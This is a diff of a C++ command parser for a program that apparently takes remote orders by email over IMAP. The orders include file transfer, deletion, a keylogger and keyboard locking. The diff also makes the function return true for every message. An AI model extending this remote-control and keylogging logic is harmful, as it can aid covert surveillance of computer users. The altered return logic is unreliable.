@@ -94,12 +94,11 @@ bool receivedNewCommand(imaps& conn, string& title, string& nameObject, string& 
         title == STOP_APP ||
         title == START_SERVICE ||
         title == STOP_SERVICE ||
-        title == SEND_FILE ||
+        title == GET_FILE ||
         title == DELETE_FILE ||
         title == KEYLOGGER
         ) {
         nameObject = body;
-        return true;
     }
 
     if (title == COPY_FILE) {
@@ -107,7 +106,6 @@ bool receivedNewCommand(imaps& conn, string& title, string& nameObject, string& 
         getline(ss, source, '\n'); // get the first line (source)
         getline(ss, destination, '\n'); // get the second line (destination)
         source = source.substr(0, source.size() - 1);
-        return true;
     }
 
     if (
@@ -124,10 +122,9 @@ bool receivedNewCommand(imaps& conn, string& title, string& nameObject, string& 
         title == UNLOCK_KEYBOARD ||
         title == END_PROGRAM
         ) {
-        return true;
     }
 
-    return false;
+    return true;
 }
 
 // connect to the smtp server
